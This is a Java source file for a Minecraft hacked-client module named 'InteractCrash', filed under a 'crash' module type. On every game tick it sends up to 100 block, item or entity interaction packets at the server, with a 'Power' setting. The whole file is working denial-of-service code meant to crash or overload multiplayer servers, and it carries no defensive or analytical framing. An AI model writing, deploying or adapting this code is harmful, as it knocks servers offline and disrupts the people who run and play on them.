/*
 * Copyright (c) Shadow client, 0x150, Saturn5VFive 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import net.minecraft.client.util.math.MatrixStack;
import net.shadow.client.feature.config.DoubleSetting;
import net.shadow.client.feature.config.EnumSetting;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.hit.EntityHitResult;

public class InteractCrash extends Module {

    final EnumSetting<Mode> mode = this.config.create(new EnumSetting.Builder<>(Mode.Block).name("Mode").description("How to interact").get());
    final DoubleSetting repeat = this.config.create(new DoubleSetting.Builder(5).min(1).max(100).name("Power").description("How much power to attack with").get());

    public InteractCrash() {
        super("InteractCrash", "crash by using many interactions", ModuleType.CRASH);
    }

    @Override
    public void tick() {
        switch(mode.getValue()){
            case Block -> {
                BlockHitResult bhr = (BlockHitResult) client.crosshairTarget;
                if (client.world.getBlockState(bhr.getBlockPos()).isAir()) return;
                for (int i = 0; i < repeat.getValue(); i++) {
                    client.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr));
                }  
            }

            case Item -> {
                for (int i = 0; i < repeat.getValue(); i++) {
                    client.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND));
                }
            }

            case Entity -> {
                Entity target;
                if (!(client.crosshairTarget instanceof EntityHitResult)) {
                    target = null;
                    return;
                }
                target = ((EntityHitResult) client.crosshairTarget).getEntity();
                for (int i = 0; i < repeat.getValue(); i++) {
                    client.player.networkHandler.sendPacket(PlayerInteractEntityC2SPacket.interact(target, false, Hand.MAIN_HAND));
                }
            }
        }
    }

    @Override
    public void enable() {
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }

    public enum Mode {
        Block,
        Item,
        Entity
    }
}
